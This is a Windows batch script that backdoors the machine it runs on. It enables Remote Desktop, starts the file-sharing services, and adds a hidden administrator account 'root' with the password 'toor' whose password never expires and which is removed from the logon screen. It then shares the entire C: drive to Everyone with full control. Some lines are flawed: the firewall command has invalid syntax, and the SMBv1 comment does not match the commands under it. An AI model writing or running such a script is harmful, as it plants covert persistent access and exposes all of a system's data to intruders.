@echo off
REM Enable Remote Desktop Protocol (RDP)
echo Enabling Remote Desktop Protocol (RDP)...

REM Set the registry key to enable Remote Desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

REM Allow Remote Desktop through Windows Firewall
netsh advfirewall firewall:enable rule name="Remote Desktop"

REM Enable SMBv1 (if necessary, SMBv1 is deprecated but some legacy systems require it)
echo Enabling SMBv1...
sc config lanmanworkstation start= auto
sc config lanmanserver start= auto
sc start lanmanworkstation
sc start lanmanserver


net user root toor /add

net localgroup Administrators root /add

net localgroup "Remote Desktop Users" root /add

net accounts /maxpwage:unlimited

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v root /t REG_DWORD /d "00000000" /f
 
REM Batch file to share the C: drive over the network

REM Define the share name and path
set SHARE_NAME=C_Drive
set SHARE_PATH=C:\

REM Create the network share
echo Sharing %SHARE_PATH% as %SHARE_NAME%...
net share %SHARE_NAME%=%SHARE_PATH% /grant:everyone,full

REM Confirm the share was created
echo Checking the share...
net share


echo Done.

